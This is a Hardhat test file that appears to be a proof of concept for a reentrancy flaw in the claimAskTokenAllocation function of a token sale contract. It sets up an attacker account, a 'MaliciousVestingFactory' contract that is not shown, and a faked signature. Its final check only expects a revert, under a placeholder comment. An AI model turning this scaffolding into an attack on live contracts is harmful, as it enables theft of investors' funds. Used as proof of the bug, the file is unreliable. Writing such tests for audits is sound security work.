const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("PoC: Reentrancy in claimAskTokenAllocation", function () {
    let sale, token, maliciousFactory;
    let deployer, attacker;

    beforeEach(async () => {
        [deployer, attacker] = await ethers.getSigners();

        // 1. Deploy mock ERC20 token
        const Token = await ethers.getContractFactory("MockERC20");
        token = await Token.deploy();
        await token.waitForDeployment();

        // 2. Deploy the vulnerable sale contract
        const Sale = await ethers.getContractFactory("LegionPreLiquidSaleV1");
        sale = await Sale.deploy();
        await sale.waitForDeployment();

        // 3. Deploy malicious vesting factory
        const MaliciousFactory = await ethers.getContractFactory("MaliciousVestingFactory");
        maliciousFactory = await MaliciousFactory.deploy(sale.target);
        await maliciousFactory.waitForDeployment();

        // 4. Set config for sale contract to use the mock token, deployer as admin, and dummy addressRegistry
        await sale.setTestConfig(
            token.target,
            deployer.address,
            deployer.address // dummy for addressRegistry
        );

        // 5. Transfer tokens to attacker and approve sale contract to spend them
        await token.transfer(attacker.address, ethers.parseEther("1000"));
        await token.connect(attacker).approve(sale.target, ethers.parseEther("1000"));

        // 6. Simulate invest call (bypass signature verification as needed)
        await sale.connect(attacker).invest(
            ethers.parseEther("1"),       // amount
            ethers.parseEther("1"),       // investAmount allowed
            ethers.parseEther("1000"),    // tokenAllocationRate
            ethers.ZeroHash,              // fake saftHash
            "0x"                         // fake signature (bypassed in test)
        );
    });

    it("should trigger reentrancy via malicious vesting factory", async () => {
        await expect(
            sale.connect(attacker).claimAskTokenAllocation(
                ethers.parseEther("1"),
                ethers.parseEther("1000"),
                ethers.ZeroHash,
                "0x"
            )
        ).to.be.reverted; // Adjust revert expectations based on your PoC
    });
});
